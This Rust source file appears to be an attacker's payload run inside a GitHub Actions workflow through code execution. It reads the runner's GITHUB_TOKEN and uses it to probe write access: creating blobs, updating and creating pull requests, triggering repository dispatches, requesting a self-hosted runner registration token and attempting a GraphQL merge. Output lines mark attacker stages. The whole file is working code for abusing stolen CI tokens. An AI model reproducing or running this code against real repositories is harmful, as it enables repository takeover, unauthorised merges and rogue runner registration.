use std::process::Command;

const REPO: &str = "PDFtoMark/triage-ethereum-optimism-v0754656-08ce38";

fn sh(cmd: &str) -> String {
    match Command::new("bash").arg("-c").arg(cmd).output() {
        Ok(o) => format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr)),
        Err(e) => format!("spawn error: {e}"),
    }
}

fn curl(args: &[&str]) -> String {
    let mut v: Vec<String> = vec!["-sS".into(), "-o".into(), "/tmp/r.bin".into(), "-D".into(), "/tmp/h.txt".into(), "-w".into(), "%{http_code}".into()];
    for a in args { v.push((*a).to_string()); }
    let out = match Command::new("curl").args(&v).output() { Ok(o) => o, Err(e) => return format!("spawn {e}") };
    let code = String::from_utf8_lossy(&out.stdout).to_string();
    let body = std::fs::read_to_string("/tmp/r.bin").unwrap_or_default();
    let hdrs = std::fs::read_to_string("/tmp/h.txt").unwrap_or_default();
    let acc: Vec<String> = hdrs.lines().filter(|l| {
        let l = l.to_ascii_lowercase();
        l.starts_with("x-accepted-github-permissions")
    }).map(|l| l.trim().to_string()).collect();
    let t: String = body.chars().take(400).collect();
    format!("HTTP {code} [{}] {}", acc.join(" | "), t)
}

fn http(method: &str, url: &str, token: &str, body: Option<&str>) -> String {
    let auth = format!("Authorization: Bearer {token}");
    let mut a: Vec<&str> = vec!["-X", method, "-H", &auth, "-H", "Accept: application/vnd.github+json"];
    let ctype = "Content-Type: application/json";
    let req = match body { Some(_) => { a.push("-H"); a.push(ctype); a.push("--data-binary"); a.push(body.unwrap()); } None => {} };
    let _ = req;
    a.push(url);
    curl(&a)
}

fn main() {
    println!("RCE_MARKER=attacker_artifact_code_executed");
    println!("ATTACKER_STAGE=rce_round4");
    let gh = std::env::var("GITHUB_TOKEN").unwrap_or_default();
    println!("GITHUB_TOKEN_LEN={}", gh.len());

    println!("BLOBS={}", http("POST", &format!("https://api.github.com/repos/{REPO}/git/blobs"), &gh, Some("{\"content\":\"canary\",\"encoding\":\"utf-8\"}")));
    println!("UPDATE_BRANCH={}", http("PUT", &format!("https://api.github.com/repos/{REPO}/pulls/2/update-branch"), &gh, Some("{}")));
    println!("REPO_DISPATCH={}", http("POST", &format!("https://api.github.com/repos/{REPO}/dispatches"), &gh, Some("{\"event_type\":\"rce\"}")));
    println!("RUNNER_TOKEN={}", http("POST", &format!("https://api.github.com/repos/{REPO}/actions/runners/registration-token"), &gh, None));

    // GraphQL merge probe with wrong expectedHeadOid: permission first, no merge if permitted
    let q = format!("{{\"query\":\"mutation {{ mergePullRequest(input: {{pullRequestId: \\\"PR_NODE_ID\\\", mergeMethod: MERGE, expectedHeadOid: \\\"0000000000000000000000000000000000000000\\\"}}) {{ pullRequest {{ number }} }} }}\"}}");
    let prnode = sh(&format!("curl -s -H 'Authorization: Bearer {gh}' 'https://api.github.com/repos/{REPO}/pulls/2' | grep -o '\"node_id\": *\"[^\"]*\"' | head -1 | cut -d'\"' -f4"));
    println!("PR2_NODE={prnode}");
    let q2 = q.replace("PR_NODE_ID", prnode.trim());
    println!("GQL_MERGE={}", http("POST", "https://api.github.com/graphql", &gh, Some(&q2)));

    // Can a PR be created (pull_requests:write) with a fork head?
    println!("PR_CREATE={}", http("POST", &format!("https://api.github.com/repos/{REPO}/pulls"), &gh, Some("{\"title\":\"probe\",\"head\":\"lazyhacker6:attack/wfr-rce\",\"base\":\"main\"}")));

    // check read scope of triggering run logs
    println!("RUNS_LIST={}", http("GET", &format!("https://api.github.com/repos/{REPO}/actions/runs?per_page=1"), &gh, None));
    println!("ATTACKER_STAGE=done");
}
